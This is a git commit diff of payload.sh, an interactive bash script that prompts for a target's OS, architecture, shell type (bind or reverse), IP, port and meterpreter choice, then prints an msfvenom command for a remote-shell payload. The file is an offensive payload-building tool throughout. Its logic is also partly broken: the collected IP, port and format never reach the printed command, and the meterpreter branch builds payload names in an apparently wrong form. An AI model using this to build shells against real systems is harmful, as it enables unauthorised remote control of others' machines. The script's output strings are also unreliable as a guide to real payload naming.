3d9b13a6442991feff6e668ca3495509997af417
root <root@localhost.localdomain>
2019-09-16 17:14:59 -0400

    simplified functions

--- payload.sh
+++ payload.sh
@@ -1,17 +1,13 @@
 #!/bin/bash
 
-
 echo "What is the operating system of your target? Example: windows, linux, osx"
-
 read OS
 
 
 echo "Is it 64 bit or 32? Please type 32 or 64."
-
 read architecture
 
 case $architecture in
-
 	32)
 		arc="x86"
 	;;
@@ -22,11 +18,9 @@ case $architecture in
 esac
 
 echo "Would you like to generate a bind shell or reverse shell? Please enter bind or reverse."
-
 read shell
 
 case $shell in
-
   reverse)
    	echo "Please enter your IP address."
         read ip
@@ -34,59 +28,80 @@ case $shell in
         read port
     ;;
 
-  bind)
+ bind)
         echo "Please enter your target's IP address."
 	read ip
 	echo "Please enter the remote port."
 	read port
-
     ;;
 esac
 
 echo "Would you like to use meterpreter? Please indicate y for yes and n for no."
-
 read meterpreter
 
 echo "What would you like the file format to be? Example: exe, raw, pl, rb, c"
-
 read format
 
 payload=""
+msfgen=""
+
+use_meterpreter() {
+case  $OS  in
+        windows)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+		msfgen="$payload/${shell}_tcp"
+        ;;
+
+        linux)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+                msfgen="$payload/${shell}_tcp"
+        ;;
+
+        osx)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+                msfgen="$payload/${shell}_tcp"
+        ;;
+
+        *)
+
+esac
+}
+
+
+no_meterpreter() {
+case  $OS  in
+        windows)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+                msfgen="$payload${shell}_tcp"
+        ;;
+
+        linux)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+                msfgen="$payload${shell}_tcp"
+        ;;
+
+        osx)
+                echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
+                msfgen="$payload${shell}_tcp"
+        ;;
+        *)
+
+esac
+}
 
 case  $meterpreter  in
 	y)
 	echo "You are using meterpreter."
 	payload="$OS/meterpreter/$arc"
+	use_meterpreter
 
         ;;
 	n)
 	echo "You are not using meterpreter."
 	payload="$OS/$arc/shell_"
+	no_meterpreter
         ;;
 	*)
-esac
-
-msfgen=""
-
-case  $OS  in
-	windows)
-		echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
-		msfgen="$payload/${shell}_tcp"
-
-        ;;
-
-	linux)
-    		echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
-		msfgen="$payload/${shell}_tcp"
-        ;;
-
-	osx)
-		echo "You will be creating a $shell shell payload for $architecture bit $OS in $format format."
-		msfgen="$payload/${shell}_tcp"
-        ;;
-
-	*)
-
 esac
 
 echo "msfvenom -p ${msfgen}"
